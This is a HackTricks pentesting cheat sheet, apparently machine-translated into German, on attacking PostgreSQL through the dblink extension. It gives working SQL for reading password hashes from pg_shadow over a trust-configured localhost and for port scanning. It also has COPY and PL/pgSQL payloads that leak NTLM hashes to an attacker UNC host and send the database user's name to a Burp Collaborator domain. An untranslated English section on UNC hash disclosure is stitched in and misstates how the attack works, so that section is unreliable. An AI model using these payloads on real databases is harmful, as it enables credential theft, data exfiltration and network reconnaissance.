<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


**Weitere Informationen zu diesen Angriffen finden Sie im Originaldokument**.

Seit **PostgreSQL 9.1** ist die Installation zus√§tzlicher Module einfach. [Registrierte Erweiterungen wie `dblink`](https://www.postgresql.org/docs/current/contrib.html) k√∂nnen mit [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html) installiert werden:
```sql
CREATE EXTENSION dblink;
```
Sobald Sie dblink geladen haben, k√∂nnen Sie einige interessante Tricks ausf√ºhren:

## Privilege Escalation

Die Datei `pg_hba.conf` k√∂nnte falsch konfiguriert sein und **Verbindungen von localhost als beliebiger Benutzer** ohne Kenntnis des Passworts zulassen. Diese Datei befindet sich normalerweise in `/etc/postgresql/12/main/pg_hba.conf` und eine fehlerhafte Konfiguration sieht wie folgt aus:
```
local    all    all    trust
```
_Beachten Sie, dass diese Konfiguration h√§ufig verwendet wird, um das Passwort eines DB-Benutzers zu √§ndern, wenn der Administrator es vergessen hat. Daher finden Sie es manchmal._

_Beachten Sie auch, dass die Datei pg_hba.conf nur vom Benutzer und der Gruppe "postgres" lesbar und nur vom Benutzer "postgres" beschreibbar ist._

Dieser Fall ist n√ºtzlich, wenn Sie bereits eine Shell im Opfer haben, da er es Ihnen erm√∂glicht, eine Verbindung zur PostgreSQL-Datenbank herzustellen.

Eine weitere m√∂gliche Fehlkonfiguration besteht darin, dass etwas wie folgt aussieht:
```
host    all     all     127.0.0.1/32    trust
```
Da es jedem auf dem Localhost erlaubt, sich als beliebiger Benutzer mit der Datenbank zu verbinden. In diesem Fall und wenn die **`dblink`**-Funktion **funktioniert**, k√∂nnten Sie **Berechtigungen eskalieren**, indem Sie sich √ºber eine bereits bestehende Verbindung mit der Datenbank verbinden und auf Daten zugreifen, auf die Sie normalerweise keinen Zugriff haben sollten:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
## Port Scanning

Durch Missbrauch von `dblink_connect` k√∂nnten Sie auch **offene Ports suchen**. Wenn diese **Funktion nicht funktioniert, sollten Sie versuchen, `dblink_connect_u()` zu verwenden**, da die Dokumentation besagt, dass `dblink_connect_u()` identisch mit `dblink_connect()` ist, au√üer dass es Nicht-Superusern erlaubt, sich mit beliebigen Authentifizierungsmethoden zu verbinden.
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
Beachten Sie, dass Sie **vorher** m√∂glicherweise Folgendes ausf√ºhren m√ºssen, um `dblink_connect` oder `dblink_connect_u` verwenden zu k√∂nnen:
```
CREATE extension dblink;
```
## UNC-Pfad - Offenlegung des NTLM-Hashes

In certain scenarios, it is possible to disclose the NTLM hash of a user by using a UNC (Universal Naming Convention) path. This technique can be used for privilege escalation or lateral movement within a network.

### How it works

1. Identify a target system that is vulnerable to UNC path disclosure. This vulnerability typically exists in older versions of Windows operating systems.

2. Craft a UNC path that includes the target system's IP address or hostname, along with a share name. For example: `\\192.168.1.100\share`.

3. Send a request to the target system using the crafted UNC path.

4. If the target system is vulnerable, it will respond with an NTLM authentication challenge.

5. Capture the NTLM challenge response, which contains the NTLM hash of the user's password.

### Mitigations

To mitigate the risk of UNC path NTLM hash disclosure, consider the following measures:

- Keep systems up to date with the latest security patches and updates.

- Disable the use of NTLM authentication in favor of more secure authentication protocols, such as Kerberos.

- Implement network segmentation to limit the exposure of vulnerable systems.

- Regularly monitor network traffic for suspicious activity and unauthorized access attempts.

By following these mitigations, you can reduce the risk of NTLM hash disclosure through UNC paths and enhance the overall security of your network.
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
